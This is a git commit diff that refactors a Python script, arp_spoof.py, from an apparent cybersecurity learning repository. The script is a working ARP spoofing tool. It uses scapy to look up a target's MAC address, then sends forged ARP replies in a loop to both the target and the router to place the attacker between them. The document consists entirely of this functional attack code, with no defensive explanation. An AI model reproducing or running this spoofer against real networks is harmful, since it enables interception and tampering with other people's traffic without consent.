a8022a3b5fe6d2a59be3541a721ae54c092accd3
tylerkain <tyler.kain@outlook.com>
2023-04-22 09:52:26 -0500

    refactor: added new control flow

--- CyberSecurity-Program/arp_spoof.py
+++ CyberSecurity-Program/arp_spoof.py
@@ -1,37 +1,35 @@
 #!/usr/bin/env python 3
 import time
-try:
-    import scapy.all as scapy
-except ImportError:
+import scapy.all as scapy
+
+ip = input("enter target ip: ")
+router_ip = input("router IP: ")
+program = True
+packet_count = 0
 
 
-    ip = input("enter target ip: ")
-    router_ip = input("router IP: ")
-    program = True
-    packet_count = 0
+def scan(ip):
+    """Scan Network For Connected Devices"""
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
 
 
-    def scan(ip):
-        """Scan Network For Connected Devices"""
-        arp_request = scapy.ARP(pdst=ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast / arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-        return answered_list[0][1].hwsrc
+def create_packet(target_ip, spoof_ip):
+    MAC = scan(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
+    scapy.send(packet)
 
 
-    def create_packet(target_ip, spoof_ip):
-        MAC = scan(target_ip)
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=MAC, psrc=spoof_ip)
-        scapy.send(packet)
-
-
-    while program:
-        try:
-            packet_count +=2
-            create_packet(ip, router_ip)
-            create_packet(router_ip, ip)
-            time.sleep(2)
-            print(f"packets sent: {packet_count}")
-        except KeyboardInterrupt:
-            print("ctrl + c pressed... quitting")
+while program:
+    try:
+        packet_count += 2
+        create_packet(ip, router_ip)
+        create_packet(router_ip, ip)
+        time.sleep(2)
+        print(f"\r Packets = {packet_count}")
+    except KeyboardInterrupt:
+        print("ctrl + c pressed... quitting")
+        program = False
